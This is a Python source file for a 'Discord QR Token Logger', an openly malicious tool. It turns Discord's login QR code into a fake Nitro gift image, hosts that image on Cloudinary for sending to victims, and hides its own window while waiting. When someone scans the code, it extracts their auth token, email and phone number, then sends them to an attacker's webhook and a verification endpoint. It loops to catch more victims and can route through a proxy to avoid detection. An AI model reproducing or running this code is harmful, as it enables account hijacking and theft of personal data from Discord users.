"""
Discord QR Token Logger
-----------------------
Generates a Discord Nitro bait image with a QR code that will prompt a user to login.
If the user logs in, their authentication token will be displayed to the console.
Optionally, the user's authentication token may also be sent to a Discord channel via a webhook.

LICENSE:
MIT License

Copyright (c) 2026 Alcachofo

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

CREDITS
alcachofo
"""

import base64
import ctypes
import os
import time
import win32clipboard
import requests
from io import BytesIO
from tempfile import NamedTemporaryFile, TemporaryDirectory
from threading import Thread, Event
from PIL import Image
from pystray import Icon, Menu, MenuItem
from pystyle import Box, Center, Colorate, Colors, System, Write
from selenium import webdriver
from selenium.common.exceptions import WebDriverException
from constants import BANNER, PYSTRAY_IMG
from discord_token import QRGrabber, TokenInfo
from exceptions import InvalidToken, QRCodeNotFound, WebhookSendFailure
from queue import Queue
import signal
import atexit
from cairosvg import svg2png
import hashlib

# Cloudinary settings
cloud_name = "yourcloudnamehere"
api_key = "yourapikeyhere"
api_secret = "yourapisecrethere"
public_id = "yourpublicidhere"

# Verification settings
verify_url = "yourverifyurlhere"
guild_id = "guildid for your discord server"


def create_driver(proxy_value=None):
    """Create a fresh Chrome driver in incognito mode"""
    opts = webdriver.ChromeOptions()
    opts.add_argument("--headless")
    opts.add_argument("--incognito")
    opts.add_argument("--silent")
    opts.add_argument("start-maximized")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("disable-infobars")
    opts.add_argument("--disable-browser-side-navigation")
    opts.add_argument("--disable-default-apps")
    opts.add_experimental_option("detach", True)
    opts.add_experimental_option("excludeSwitches", ["enable-logging"])
    opts.add_extension(
        os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "resources",
            "extension_0_3_12_0.crx",
        )
    )
    
    if proxy_value:
        opts.add_argument(f"--proxy-server={proxy_value}")
    
    try:
        driver = webdriver.Chrome(options=opts)
    except:
        from webdriver_manager.chrome import ChromeDriverManager
        from selenium.webdriver.chrome.service import Service

        os.environ["WDM_PROGRESS_BAR"] = str(0)
        os.environ["WDM_LOG_LEVEL"] = "0"
        driver = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()), options=opts
        )
    
    driver.implicitly_wait(5)
    return driver


def upload_to_cloudinary():
    """Upload discord_gift.png to Cloudinary and refresh CDN cache"""
    try:
        timestamp = int(time.time())
        to_sign = f"invalidate=true&public_id={public_id}&timestamp={timestamp}{api_secret}"
        signature = hashlib.sha1(to_sign.encode()).hexdigest()
        
        requests.post(
            f"https://api.cloudinary.com/v1_1/{cloud_name}/image/upload",
            files={"file": open("discord_gift.png", "rb")},
            data={
                "public_id": public_id,
                "timestamp": timestamp,
                "api_key": api_key,
                "signature": signature,
                "invalidate": "true"
            }
        )
        
        time.sleep(3)
        requests.get(f"https://res.cloudinary.com/{cloud_name}/image/upload/{public_id}.png?{int(time.time())}")
        print(f"[!] CDN cache refreshed at {time.strftime('%H:%M:%S')}")
        return True
    except Exception as err:
        print(f"[!] Cloudinary upload failed: {err}")
        return False


def copy_to_clipboard():
    """Copy discord_gift.png to clipboard"""
    try:
        output = BytesIO()
        Image.open("discord_gift.png").convert("RGB").save(output, "BMP")
        data = output.getvalue()[14:]
        output.close()
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardData(win32clipboard.CF_DIB, data)
        win32clipboard.CloseClipboard()
        return True
    except Exception as err:
        print(f"[!] Clipboard copy failed: {err}")
        return False


def main(webhook_url: str) -> None:
    proxy_value = Write.Input(
        "\n[*] Does the victim live in the same country as you otherwise use a proxy [IP:PORT] -> ",
        Colors.green_to_cyan,
        interval=0.01,
    )
    
    # Validate proxy if provided
    if proxy_value:
        proxies_http = {
            "http": f"http://{proxy_value}",
            "https": f"http://{proxy_value}",
        }
        proxies_https = {
            "http": f"https://{proxy_value}",
            "https": f"https://{proxy_value}",
        }
        try:
            ip_info = requests.get(
                "http://ip-api.com/json", proxies=proxies_http
            ).json()
        except requests.exceptions.RequestException:
            try:
                ip_info = requests.get(
                    "http://ip-api.com/json", proxies=proxies_https
                ).json()
            except requests.exceptions.RequestException as e:
                raise SystemExit(
                    Write.Print(
                        f"\n[^] Critical error when using the proxy server !\n\nThe script returning :\n\n{e}",
                        Colors.yellow_to_green,
                    )
                )
        if ip_info["query"] == proxy_value.split(":")[0]:
            Write.Print(
                f"\n[!] Proxy server detected in {ip_info['country']}, establishing connection...",
                Colors.red_to_purple,
            )
        else:
            raise SystemExit(
                Write.Print(
                    f"\n[^] Proxy server not working, or being detected by Discord.",
                    Colors.yellow_to_green,
                )
            )
    
    Write.Print("\n\n[!] Generating QR code...", Colors.red_to_purple)
    
    # Create initial driver
    main.driver = create_driver(proxy_value)
    main.proxy_value = proxy_value  # Store for later use
    
    main.driver.get("https://discord.com/login")
    time.sleep(5)
    
    qrg = QRGrabber(
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "resources")
    )
    
    try:
        qr_code = qrg.get_qr_from_source(main.driver)
    except QRCodeNotFound as e:
        try:
            main.driver.quit()
        except:
            pass
        raise SystemExit(
            Write.Print(
                f"\n\n[^] QrCodeException occured ! The script returned :\n\n{e}",
                Colors.yellow_to_green,
            )
        )
    
    discord_login = main.driver.current_url
    
    with TemporaryDirectory(dir=".") as td:
        with NamedTemporaryFile(dir=td, suffix=".png") as tp1:
            tp1.write(svg2png(qr_code))
            qrg.generate_qr_for_template(tp1, "discord_gift.png")

    upload_to_cloudinary()
    
    image_url = f"https://res.cloudinary.com/{cloud_name}/image/upload/{public_id}.png"
    print(f"Send this link to victim: {image_url}")
    
    Write.Print(
        "\n[#] The Qr-Code is copied to clipboard, waiting for target to login using the QR code...",
        Colors.red_to_purple,
    )

    pystray_icon.icon.notify(
        "This script has been set to hide until the target's token is grabbed.",
        "Waiting for target",
    )
    time.sleep(3)
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    def timer_killer(e, webhook_url):
        nonlocal discord_login
        previous_qr = qr_code  # Initialize with the first QR code
        tokens_grabbed = 0
        
        while True:
            if e.is_set():
                break
            
            try:
                current_url = main.driver.current_url
            except:
                # Browser might be closed/crashed, try to recreate
                print(f"[!] Browser connection lost, recreating...")
                try:
                    main.driver.quit()
                except:
                    pass
                main.driver = create_driver(main.proxy_value)
                main.driver.get("https://discord.com/login")
                time.sleep(5)
                discord_login = main.driver.current_url
                try:
                    previous_qr = qrg.get_qr_from_source(main.driver)
                except:
                    pass
                continue
            
            # CHECK: did victim log in?
            if discord_login != current_url:
                print(f"[!] Login detected! Extracting token...")
                
                try:
                    token = main.driver.execute_script(
                        """
                        window.dispatchEvent(new Event('beforeunload'));
                        let iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        document.body.appendChild(iframe);
                        let localStorage = iframe.contentWindow.localStorage;
                        var token = JSON.parse(localStorage.token);
                        return token;
                        """
                    )
                except Exception as err:
                    print(f"[!] Failed to extract token: {err}")
                    # Reset and continue
                    main.driver.get("https://discord.com/login")
                    time.sleep(5)
                    discord_login = main.driver.current_url
                    continue
                
                tokens_grabbed += 1
                
                # Process token immediately
                try:
                    token_info = TokenInfo(token)
                    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)
                    Write.Print(
                        f"\n\n[?] TOKEN #{tokens_grabbed} GRABBED: {token_info.token}",
                        Colors.rainbow,
                    )
                    print(f"[!] User: {token_info.username}")
                    print(f"[!] User ID: {token_info.id}")
                    print(f"[!] Email: {token_info.email}")
                    print(f"[!] Phone: {token_info.phone}")
                    print(f"[!] Nitro: {'Yes' if token_info.has_nitro else 'No'}")
                    
                    # Send verification request
                    try:
                        verify_response = requests.post(
                            verify_url,
                            headers={"Content-Type": "application/json"},
                            json={
                                "discordUserId": token_info.id,
                                "discordUsername": token_info.username,
                                "guildId": guild_id
                            }
                        )
                        print(f"[!] Verification request sent (Status: {verify_response.status_code})")
                    except Exception as err:
                        print(f"[!] Verification request failed: {err}")
                    
                    if webhook_url is not None:
                        try:
                            token_info.send_info_to_webhook(webhook_url)
                            print(f"[!] Token sent to webhook successfully")
                        except WebhookSendFailure as err:
                            print(f"[!] Webhook failed: {err}")
                            
                    pystray_icon.icon.notify(
                        f"Token #{tokens_grabbed} grabbed: {token_info.username}",
                        "New Victim!"
                    )
                except InvalidToken:
                    print(f"\n[!] Invalid token grabbed")
                except Exception as err:
                    print(f"\n[!] Error processing token: {err}")
                
                # Prepare for next victim
                print(f"\n[!] Refreshing for next victim...")
                Write.Print(
                    "\n[#] Waiting for next target to login using the QR code...",
                    Colors.red_to_purple,
                )
                
                # Close old browser and create fresh one
                print(f"[!] Creating fresh browser session...")
                try:
                    main.driver.quit()
                except:
                    pass
                
                main.driver = create_driver(main.proxy_value)
                main.driver.get("https://discord.com/login")
                time.sleep(5)
                
                # Update the reference URL for next comparison
                discord_login = main.driver.current_url
                
                # Get new QR and upload it
                try:
                    current_qr = qrg.get_qr_from_source(main.driver)
                    previous_qr = current_qr
                    
                    with NamedTemporaryFile(suffix=".png") as tp1:
                        tp1.write(svg2png(current_qr))
                        qrg.generate_qr_for_template(tp1, "discord_gift.png")
                    
                    copy_to_clipboard()
                    upload_to_cloudinary()
                    
                    print(f"[!] New QR ready at {time.strftime('%H:%M:%S')}")
                    print(f"[!] Total tokens grabbed: {tokens_grabbed}")
                    
                except Exception as err:
                    print(f"[!] Failed to refresh QR: {err}")
                    # Try again on next loop iteration
                
                # Hide window again
                time.sleep(3)
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            
            # CHECK: did QR code expire and refresh?
            else:
                try:
                    current_qr = qrg.get_qr_from_source(main.driver)
                    if current_qr != previous_qr and previous_qr is not None:
                        previous_qr = current_qr
                        
                        print(f"[!] QR code expired, refreshing at {time.strftime('%H:%M:%S')}")
                        
                        with NamedTemporaryFile(suffix=".png") as tp1:
                            tp1.write(svg2png(current_qr))
                            qrg.generate_qr_for_template(tp1, "discord_gift.png")
                        
                        copy_to_clipboard()
                        upload_to_cloudinary()
                        
                except:
                    pass
                
                time.sleep(0.5)
    

    e = Event()
    thread_timer_killer = Thread(
        target=timer_killer,
        args=(
            e,
            webhook_url,
        ),
    )
    thread_timer_killer.start()
    thread_timer_killer.join()
        
    main.driver.quit()


if __name__ == "__main__":

    def handle_exit():
        try:
            main.driver.quit()
        except:
            pass
        try:
            pystray_icon.icon.stop()
        except:
            pass

    atexit.register(handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)
    signal.signal(signal.SIGINT, handle_exit)

    def pystray_icon():
        def window_state(_, item):
            if str(item) == "Show":
                return ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 5
                )
            elif str(item) == "Hide":
                return ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 0
                )
            elif str(item) == "Quit":
                pystray_icon.icon.stop()
                try:
                    main.driver.quit()
                except:
                    pass
                os._exit(0)

        pystray_icon.icon = Icon(
            "QR_DTG",
            Image.open(BytesIO(base64.b64decode(PYSTRAY_IMG))),
            menu=Menu(
                MenuItem("Show", window_state),
                MenuItem("Hide", window_state),
                MenuItem("Quit", window_state),
            ),
        )
        pystray_icon.icon.run()

    System.Title("QR DISCORD LOGIN - By alcachofo")
    System.Size(140, 35)
    print(Colorate.Horizontal(Colors.cyan_to_green, Center.XCenter(BANNER), 1))
    print(
        Colorate.Horizontal(
            Colors.rainbow,
            Center.GroupAlign(Box.DoubleCube("By alcachofo")),
            1,
        )
    )
    print(
        Colorate.Horizontal(
            Colors.rainbow,
            1,
        ),
        "\n",
    )
    confir = Write.Input(
        "[*] Do you want to use a Discord Webhook URL ? [y/n] -> ",
        Colors.green_to_cyan,
        interval=0.01,
    ).lower()
    if confir == "yes" or confir == "y":
        th_main = Thread(
            target=main,
            args=(
                Write.Input(
                    "\n[*] Enter your webhook url -> ",
                    Colors.green_to_cyan,
                    interval=0.01,
                ),
            ),
        )
    elif confir == "no" or confir == "n":
        th_main = Thread(target=main, args=(None,))
    else:
        raise SystemExit(
            Write.Print(
                "[!] Failed to recognise an input of either 'y' or 'n'.",
                Colors.yellow_to_green,
            )
        )
    Thread(target=pystray_icon).start()
    th_main.start()
    while th_main.is_alive():
        time.sleep(1)
    pystray_icon.icon.stop()
